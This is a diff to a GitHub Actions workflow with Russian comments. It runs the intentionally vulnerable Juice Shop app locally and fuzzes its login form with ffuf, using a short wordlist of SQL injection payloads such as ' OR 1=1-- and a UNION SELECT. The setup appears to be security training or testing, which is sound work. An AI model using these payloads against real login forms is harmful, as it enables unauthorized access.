@@ -13,27 +13,27 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v4
 
-    # 2. Устанавливаем Docker
+    # 2. Проверяем Docker (он уже установлен)
     - name: Check Docker
       run: |
-       docker --version
-
+        docker --version
 
     # 3. Запускаем Juice Shop
     - name: Run Juice Shop
       run: |
         docker run -d -p 3000:3000 bkimminich/juice-shop
-        sleep 20
+        sleep 25
 
     # 4. Устанавливаем ffuf
     - name: Install ffuf
       run: |
+        sudo apt-get update
         sudo apt-get install -y ffuf
 
     # 5. Создаём словарь SQL-инъекций (SQLite)
     - name: Create SQL injection wordlist
       run: |
-        mkdir wordlists
+        mkdir -p wordlists
         cat <<EOF > wordlists/sql.txt
         ' OR '1'='1
         ' OR 1=1--
@@ -45,10 +45,10 @@ jobs:
         ' UNION SELECT sqlite_version()--
         EOF
 
-    # 6. Запускаем фаззинг логина
+    # 6. Фаззинг формы логина
     - name: Run ffuf against login
       run: |
-        mkdir results
+        mkdir -p results
         ffuf -u http://localhost:3000/rest/user/login \
         -X POST \
         -H "Content-Type: application/json" \
@@ -58,7 +58,7 @@ jobs:
         -of json \
         -o results/ffuf-login.json
 
-    # 7. Сохраняем результаты как артефакт
+    # 7. Сохраняем артефакт
     - name: Upload artifact
       uses: actions/upload-artifact@v4
       with:
